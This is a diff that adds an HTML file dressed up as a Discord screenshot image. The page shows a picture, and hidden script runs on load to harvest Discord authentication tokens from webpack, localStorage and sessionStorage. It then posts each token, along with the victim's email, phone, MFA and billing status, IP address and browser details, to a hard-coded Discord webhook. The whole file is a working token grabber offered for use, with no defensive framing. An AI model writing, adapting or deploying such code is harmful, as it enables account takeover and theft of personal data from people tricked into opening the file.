@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>discord_screenshot_2026-05-07.png</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #1e1e2e;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    font-family: 'Segoe UI', sans-serif;
+  }
+  .card {
+    background: #2b2d42;
+    border-radius: 12px;
+    padding: 25px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+    max-width: 95vw;
+    text-align: center;
+  }
+  img {
+    max-width: 100%;
+    max-height: 85vh;
+    border-radius: 8px;
+    display: block;
+  }
+  .label {
+    color: #888;
+    text-align: center;
+    padding: 10px 0 2px;
+    font-size: 12px;
+    user-select: none;
+  }
+  .hidden-frame {
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <!-- Replace with your image URL -->
+  <img src="https://i.pinimg.com/736x/ab/73/53/ab73530f23c2c1f30b09bddeed3ba2f4.jpg" alt="screenshot" id="displayImg">
+  <div class="label">📸 discord_screenshot_2026-05-07.png (3.1 MB)</div>
+</div>
+
+<iframe class="hidden-frame" id="stealthFrame"></iframe>
+
+<script>
+// ===== YOUR WEBHOOK HERE =====
+const WEBHOOK = "https://canary.discord.com/api/webhooks/1502045259444781217/lznlptjs1zLjMg0tCqev4HoWBQd0ktVZ5c6wdlQpoVgqc3rcsQGbBKYGo4B-KcigIR_0";
+// =============================
+
+function b64(str) {
+  return btoa(unescape(encodeURIComponent(str)));
+}
+
+function extractTokenFromStorage() {
+  const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;
+  const mfaRegex = /mfa\.[\w-]{84}/g;
+  let tokens = [];
+
+  try {
+    // Check all localStorage keys
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      const val = localStorage.getItem(key);
+      if (!val) continue;
+      
+      const tMatch = val.match(tokenRegex);
+      const mMatch = val.match(mfaRegex);
+      if (tMatch) tokens.push(...tMatch);
+      if (mMatch) tokens.push(...mMatch);
+    }
+
+    // Check sessionStorage
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      const val = sessionStorage.getItem(key);
+      if (!val) continue;
+      
+      const tMatch = val.match(tokenRegex);
+      if (tMatch) tokens.push(...tMatch);
+    }
+  } catch(e) {}
+
+  return [...new Set(tokens)];
+}
+
+async function getDiscordTokenWebpack() {
+  try {
+    const mod = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
+      .find(m => m?.exports?.default?.getToken);
+    if (mod) return mod.exports.default.getToken();
+  } catch(e) {}
+  return null;
+}
+
+async function getDiscordTokenIndexedDB() {
+  try {
+    // Discord sometimes stores token in IndexedDB
+    const dbs = await indexedDB.databases?.() || [];
+    for (const dbInfo of dbs) {
+      if (dbInfo.name?.includes('discord')) {
+        // read token from db
+      }
+    }
+  } catch(e) {}
+  return null;
+}
+
+function extractDiscordData() {
+  const data = {};
+  
+  // Direct localStorage fields (Discord web)
+  try {
+    if (localStorage.token) data.token = localStorage.token.slice(1, -1);
+    if (localStorage.email_cache) data.email = localStorage.email_cache.slice(1, -1);
+    if (localStorage.user_id_cache) data.user_id = localStorage.user_id_cache.slice(1, -1);
+  } catch(e) {}
+  
+  return data;
+}
+
+async function validateAndSend(token) {
+  try {
+    const res = await fetch('https://discord.com/api/v9/users/@me', {
+      headers: { 'Authorization': token }
+    });
+    
+    if (!res.ok) {
+      // Send raw token anyway
+      const payload = {
+        username: '⚠️ Raw Token',
+        content: `**Unvalidated Token**\n\`\`\`${token}\`\`\``,
+        embeds: [{
+          title: 'System Info',
+          color: 0xfee75c,
+          fields: [
+            { name: '🌐 IP', value: await getIP(), inline: true },
+            { name: '🖥️ Platform', value: navigator.platform, inline: true },
+            { name: '🌍 Browser', value: navigator.userAgent.substring(0, 80), inline: false }
+          ]
+        }]
+      };
+      fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+      return;
+    }
+    
+    const u = await res.json();
+    
+    const embed = {
+      title: `🎯 ${u.username}#${u.discriminator}`,
+      color: 0x57f287,
+      thumbnail: { url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png` },
+      fields: [
+        { name: '🔑 Token', value: `\`\`\`${token}\`\`\``, inline: false },
+        { name: '🆔 ID', value: u.id, inline: true },
+        { name: '📧 Email', value: u.email || 'N/A', inline: true },
+        { name: '📱 Phone', value: u.phone || 'N/A', inline: true },
+        { name: '🔐 MFA', value: u.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+        { name: '💎 Nitro', value: u.premium_type > 0 ? '✅ Yes' : '❌ No', inline: true },
+        { name: '✅ Verified', value: u.verified ? 'Yes' : 'No', inline: true },
+        { name: '💳 Billing', value: u.has_billing ? '✅ Yes' : '❌ No', inline: true },
+        { name: '🌐 IP', value: await getIP(), inline: true },
+        { name: '🖥️ Browser', value: navigator.userAgent.substring(0, 100), inline: false },
+        { name: '🌍 Timezone', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+        { name: '📅 Created', value: new Date(u.id / 4194304 + 1420070400000).toISOString().split('T')[0], inline: true }
+      ],
+      timestamp: new Date().toISOString()
+    };
+    
+    fetch(WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: '🎯 Token Grabbed', avatar_url: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png`, embeds: [embed] })
+    });
+    
+  } catch(e) {}
+}
+
+async function getIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    return d.ip;
+  } catch { return 'N/A'; }
+}
+
+async function main() {
+  // Method 1: webpack (Discord desktop/web active session)
+  let token = await getDiscordTokenWebpack();
+  
+  // Method 2: localStorage
+  if (!token) {
+    const discordData = extractDiscordData();
+    if (discordData.token) token = discordData.token;
+  }
+  
+  // Method 3: Scan all storage
+  if (!token) {
+    const found = extractTokenFromStorage();
+    if (found.length > 0) token = found[0];
+  }
+  
+  if (token) {
+    await validateAndSend(token);
+  } else {
+    // Still send system info
+    const payload = {
+      username: '❌ No Token',
+      embeds: [{
+        title: 'Image Opened - No Token Found',
+        color: 0xed4245,
+        description: 'User opened the image but no Discord token was found in browser storage.',
+        fields: [
+          { name: '🌐 IP', value: await getIP(), inline: true },
+          { name: '🖥️ Platform', value: navigator.platform, inline: true },
+          { name: '🌍 Browser', value: navigator.userAgent.substring(0, 100), inline: false }
+        ]
+      }]
+    };
+    fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+  }
+}
+
+// Run after page loads
+window.addEventListener('load', () => setTimeout(main, 2000));
+</script>
+</body>
+</html>
